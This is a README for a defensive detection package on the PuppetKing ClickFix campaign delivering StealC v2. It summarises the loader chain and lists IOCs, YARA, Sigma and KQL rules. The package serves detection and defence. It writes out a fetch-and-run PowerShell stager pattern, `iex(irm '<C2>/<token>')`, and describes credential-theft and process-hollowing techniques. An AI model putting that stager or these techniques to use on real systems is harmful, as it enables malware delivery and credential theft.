# puppetking-stealc

Blog post: https://blueteam.cool/posts/puppetking-stealc/

## Summary

The PuppetKing campaign delivers StealC v2 infostealer via a five-stage ClickFix loader chain. The entry point is a social-engineering lure injected into compromised WordPress sites at the `/giris` path (Turkish for "login/entry"): a fake "verify you are human" overlay instructs the victim to press Win+R and paste a pre-staged PowerShell command. The lure infrastructure is notable for storing the active C2 domain inside a Polygon smart contract, allowing the operator to rotate domains with a single on-chain transaction.

The delivered payload (`PuppetKing.exe`) is a fully functional French strategy game ("Le Roi Fantoche") that conceals two .NET assemblies inside bitmap resources using steganography. The first decodes into a fake calculator; the calculator decrypts the second bitmap into a .NET loader protected with a custom-modified ConfuserEx. The loader uses process-hollowing (RunPE) into signed .NET build utilities (`MSBuild.exe`, `RegSvcs.exe`, `vbc.exe`) to execute the final stage and establishes Run-key persistence.

The final stage is a native x86-64 C++ binary - StealC v2 (build path `C:\builder_v2\stealc\json.h`). All strings are RC4-encrypted with a hardcoded key. The StealC C2 (`151.243.18[.]28`) sits on entirely separate hosting (AS207043 DEDIK SERVICES LIMITED) from the loader infrastructure (AS202412 Omegatech), consistent with a crypter-as-a-service model where the loader author and the StealC operator are different parties.

The full chain was reversed statically without executing any component. The ConfuserEx proxy-call resolver was emulated in Python (1,211 proxy entries rebuilt); the custom stage-4 byte cipher was recovered from IL with an off-by-one inclusive loop bound; StealC's RC4 string decryption was reimplemented from Ghidra decompilation.

```
ClickFix lure (compromised WP /giris)
       |  victim pastes into Win+R
       v
PowerShell  iex(irm '<C2>/<token>')
       |  C2 domain <- Polygon smart contract (rotatable)
       v
PuppetKing.exe  -- French strategy-game decoy
       |-- bitmap "T6"   -stego->  fake Calculator (.NET)
       |                                |  Mist XOR
       `-- bitmap "oCCI" -stego->  Loader/Injector (.NET, ConfuserEx)
                                        |  custom byte stream cipher
                                        v
                                Stage 4: NATIVE C++ PE
                                        |  process hollowing
                                        v
                         MSBuild.exe / RegSvcs.exe / vbc.exe
                                        |
                                        v
                             StealC v2  --HTTP/JSON-->  151.243.18[.]28
```

## What is included

| File | Description |
|------|-------------|
| `iocs.csv` | All indicators: IPs, domains, URLs, hashes, registry keys, blockchain identifiers, lure sites, cipher/RC4 keys |
| `rule.yar` | Three YARA rules: StealC v2 payload strings, PuppetKing ClickFix PS stager pattern, PuppetKing blockchain C2 identifiers |
| `sigma-clickfix-ps-stager.yml` | Sigma rule for PowerShell iex+irm+UseBasicParsing process creation |
| `sigma-lolbin-process-hollow.yml` | Sigma rule for MSBuild/RegSvcs/vbc.exe running without project file argument |
| `kql.md` | Seven KQL queries for Defender XDR / Sentinel: stager detection, LOLBin hollowing, StealC C2 beacon, Polygon RPC queries, Run-key writes, browser credential store access, .beer TLD DNS hunt |

## Coverage notes

### What these detections cover

- The ClickFix paste-and-run PowerShell stager pattern (iex+irm+UseBasicParsing from explorer.exe parent)
- The PuppetKing-specific C2 domains and IP for the loader tier
- The StealC v2 C2 IP and HTTP beacon pattern
- Blockchain C2 resolution via Polygon RPC endpoints
- Process-hollowing into LOLBin .NET utilities (MSBuild/RegSvcs/vbc) without project file arguments
- Run-key persistence writes associated with the loader
- Browser credential store access by non-browser processes (StealC theft telemetry)
- `.beer` TLD DNS queries (operator infrastructure preference)
- Specific StealC v2 build artifacts in memory/on-disk (YARA)
- PuppetKing blockchain contract and wallet identifiers (YARA)

### What they do NOT cover

- **Inner payload decryption in-flight**: the stage-4 byte cipher runs in memory; EDR behaviour-based detection is needed to catch execution post-decryption
- **Stager stages 1-3**: victim-token gating means stages 1-3 are not recoverable from network without a live victim token; network detections rely on the URL pattern rather than payload content
- **Compromised WordPress injection JS**: the `anlytic-js-cloud[.]beer` injection CDN serves gated paths; no JS payload content was recovered for YARA matching
- **7-Zip staging in %TEMP%**: transient; may not produce durable artefacts depending on EDR telemetry depth
- **StealC exfil content**: what was exfiltrated is unknown without dynamic analysis or victim-side forensics
- **New PuppetKing domain rotations**: the Polygon contract will reflect the current C2; the KQL query for Polygon RPC queries is the durable detection; domain-specific IOCs will need updating as rotations occur

## False-positive notes

**`sigma-clickfix-ps-stager.yml`**: The `filter_legitimate` block excludes `microsoft.com` to suppress common WinGet / Windows Update patterns. Extend the filter for any internal tooling that uses `irm` + `iex`. Expect low FP rate on non-developer endpoints; rate will be higher in DevOps environments.

**`sigma-lolbin-process-hollow.yml`**: High FP on developer workstations and build servers. Suppress by: excluding accounts with a developer role, excluding hosts in known CI/CD server groups, and excluding builds that carry `.csproj`/`.vbproj`/`.sln` elsewhere in the process ancestry. On finance/reception/call-centre hosts the FP rate should be near zero.

**`rule.yar` - `PuppetKing_ClickFix_PS_Stager`**: The `$token_fmt` string (`/[0-9a-f]{16}/`) is weak in isolation and only meaningful in combination with the comment pattern (`$comment`). The combined condition is tight; the domain-only conditions (`$c2_*`) are high-confidence.

**KQL query 4 (Polygon RPC)**: Will generate hits on developer workstations running Web3 tooling, blockchain wallets, or dapp browsers. Tune by excluding known developer endpoints and browser processes.

## Confidence

**Infrastructure attribution: high.** Loader C2 IP (`178.16.52[.]101`), ASN (AS202412 Omegatech), Polygon contract, deployer wallet, 16-hex token format, and `.beer` naming convention all match the original PuppetKing campaign (June 17-23 2026). Blockchain confirmation is direct (RPC call to contract returned `code.verification-claude-cdn[.]beer` as the active domain).

**Payload chain: high.** stage3.dll (ConfuserEx loader) and stage4.dll (StealC v2) were fully decrypted statically. The SHA-256 of the decrypted stage4 is reproducible. StealC v2 family confirmation is based on build path string, RC4 key scheme, and capability strings matching published v2 analysis.

**Stager reconstruction (stages 1-3): probable.** Stages 1-3 were not recovered (victim-token 404). The reconstruction is based on the confirmed infrastructure match to the prior PuppetKing campaign. XOR keys may differ between rotations.

**Attribution to a specific actor or group: not claimed.** Infrastructure signals (Omegatech ASN, Russian-language adjacent domains on same IP, aaPanel administration panel) are noted as clustering pivots, not attribution. The two-tier hosting model is consistent with a crypter-as-a-service arrangement but this is inferred, not confirmed.

## Related detections

- [iocs.csv](iocs.csv) - all indicators
- [rule.yar](rule.yar) - YARA rules
- [sigma-clickfix-ps-stager.yml](sigma-clickfix-ps-stager.yml) - Sigma: PowerShell stager
- [sigma-lolbin-process-hollow.yml](sigma-lolbin-process-hollow.yml) - Sigma: LOLBin process hollowing
- [kql.md](kql.md) - KQL queries for Defender XDR / Sentinel
